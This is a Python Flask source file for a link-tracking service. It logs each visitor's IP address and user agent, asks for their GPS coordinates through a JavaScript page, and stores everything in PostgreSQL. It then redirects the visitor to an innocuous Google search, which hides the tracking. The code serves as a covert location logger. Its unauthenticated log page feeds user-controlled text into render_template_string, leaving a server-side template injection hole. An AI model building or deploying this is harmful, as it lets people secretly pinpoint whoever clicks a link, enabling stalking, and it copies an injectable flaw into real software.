# app.py (Final version for Render PostgreSQL)

from flask import Flask, request, redirect, render_template_string, render_template
from ip_locator import get_location_from_ip 
import datetime
import os 
# Required PostgreSQL driver
import psycopg2 
from urllib.parse import urlparse 

app = Flask(__name__)

# --- Configuration ---
FINAL_DESTINATION_URL = "https://www.google.com/search?q=location+based+facility+provided"
# NOTE: DATABASE_URL is NO LONGER defined globally. It is read inside the function.


# --- Database Connection Utility ---
def get_db_connection():
    # 1. Try reading the URL from a Secret File (Most reliable method on Render)
    secret_file_path = '/etc/secrets/db_url'
    db_url = None
    
    if os.path.exists(secret_file_path):
        try:
            with open(secret_file_path, 'r') as f:
                db_url = f.read().strip()
        except Exception as e:
            # If we fail to read the file, fall through to reading the standard env var
            print(f"Error reading secret file: {e}")

    # 2. Fall back to reading the standard environment variable (the standard link method)
    if not db_url:
        db_url = os.environ.get('DATABASE_URL')
    
    if not db_url:
        raise Exception("DATABASE_URL environment variable is not set!")
    
    # 3. Connect to PostgreSQL
    # sslmode='require' is essential for secure connections on Render.
    return psycopg2.connect(db_url, sslmode='require')


# --- Database Setup (PostgreSQL) ---
def init_db():
    """Initializes the PostgreSQL database, creating the 'clicks' table if it doesn't exist."""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # PostgreSQL-specific SQL for table creation (using SERIAL PRIMARY KEY)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS clicks (
                id SERIAL PRIMARY KEY,
                timestamp TEXT,
                ip_address TEXT,
                country TEXT,
                city TEXT,
                latitude REAL,
                longitude REAL,
                source TEXT, 
                user_agent TEXT
            )
        """)
        conn.commit()
        cursor.close()
        conn.close()
        print("--- POSTGRES DB INITIALIZED SUCCESSFULLY ---")
        
    except Exception as e:
        # This print statement is critical for debugging during the Pre-Deploy Command run
        print(f"--- POSTGRES CONNECTION/INIT ERROR: {e} ---")
        # Re-raise the exception so the Pre-Deploy command fails if the table couldn't be created
        raise


# --- Database Logging Function ---
def log_click_data(ip, location, user_agent, source="IP"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data = (
        timestamp,
        ip,
        location.get('country', 'N/A'),
        location.get('city', 'N/A'),
        location.get('latitude'),
        location.get('longitude'),
        source, 
        user_agent
    )

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Uses %s placeholders for psycopg2
        cursor.execute("""
            INSERT INTO clicks (timestamp, ip_address, country, city, latitude, longitude, source, user_agent) 
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
        """, data) 
        
        conn.commit()
        cursor.close()
        conn.close()
        print(f"--- LOGGED ({source}) --- IP: {ip} | Loc: {location.get('city', 'N/A')}, {location.get('country', 'N/A')} | Coords: {location.get('latitude')}")
        
    except Exception as e:
        print(f"--- POSTGRES LOGGING ERROR: {e} ---")


# --- 1. Main Link Click (Entry Point) ---
@app.route('/track_click')
def track_click():
    user_ip = request.remote_addr 
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Redirect to the page that requests GPS location via JavaScript
    return redirect(f"/request_location?ip={user_ip}&ua={user_agent}")


# --- 2. Location Request Page (Serves HTML with JS) ---
@app.route('/request_location')
def request_location():
    # Looks for the file in the 'templates' folder
    return render_template('request_location.html', 
                            user_ip=request.args.get('ip'), 
                            user_agent=request.args.get('ua'))


# --- 3. GPS Location Received (Precise Data) ---
@app.route('/location_received')
def location_received():
    ip = request.args.get('ip')
    ua = request.args.get('ua')
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    
    location_data = {
        "country": "GPS_DATA", 
        "city": "GPS_DATA", 
        "latitude": float(lat), 
        "longitude": float(lon)
    }

    log_click_data(ip, location_data, ua, source="GPS")
    print(f"--- FINAL GPS Location for Facility --- Lat: {lat}, Lon: {lon}")
    
    # Redirect to final destination (e.g., a map, or a localized version of your page)
    return redirect(FINAL_DESTINATION_URL)


# --- 4. Fallback (Location Denied or Failed) ---
@app.route('/fallback')
def fallback():
    ip = request.args.get('ip')
    ua = request.args.get('ua')
    
    # Run IP Geolocation as a fallback
    location_data = get_location_from_ip(ip)
    
    if not location_data:
        location_data = {"country": "Unknown", "city": "Unknown", "latitude": None, "longitude": None}

    # Log the general IP data
    log_click_data(ip, location_data, ua, source="IP_FALLBACK")
    
    return redirect(FINAL_DESTINATION_URL)


# --- 5. View Logs (Admin Route) ---
@app.route('/view_logs')
def view_logs():
    logs = []
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Run query on the PostgreSQL database
        cursor.execute("SELECT id, timestamp, ip_address, country, city, latitude, longitude, source, user_agent FROM clicks ORDER BY timestamp DESC")
        logs = cursor.fetchall()
        cursor.close()
        conn.close()
        
    except Exception as e:
        return render_template_string(f"<h1>Logs</h1><p>Database Connection Error: {e}</p>")


    html = "<h1>Click Tracking Logs</h1><table border='1' style='width: 100%;'><tr><th>ID</th><th>Time</th><th>IP</th><th>Country</th><th>City</th><th>Lat</th><th>Lon</th><th>Source</th><th>User Agent</th></tr>"
    
    if not logs:
        html += "<tr><td colspan='9'>No clicks recorded yet.</td></tr>"
    else:
        for row in logs:
            ua_display = row[8][:50] + '...' if len(str(row[8])) > 50 else str(row[8])
            html += f"<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[3]}</td><td>{row[4]}</td><td>{row[5]}</td><td>{row[6]}</td><td>{row[7]}</td><td>{ua_display}</td></tr>"
    
    html += "</table>"
    return render_template_string(html)

# --- 6. Root/Health Check Routes ---
@app.route('/')
def root_redirect():
    return redirect('/track_click')

@app.route('/health')
def health_check():
    return "OK", 200

if __name__ == '__main__':
    # 🔴 CRITICAL CHANGE: init_db() IS REMOVED HERE. 
    # It must be run as a separate Python command during Render deployment setup.
    
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    print("--- Flask GPS/IP Geolocation Tracker Running ---")
    app.run(debug=True, host='127.0.0.1', port=5000)
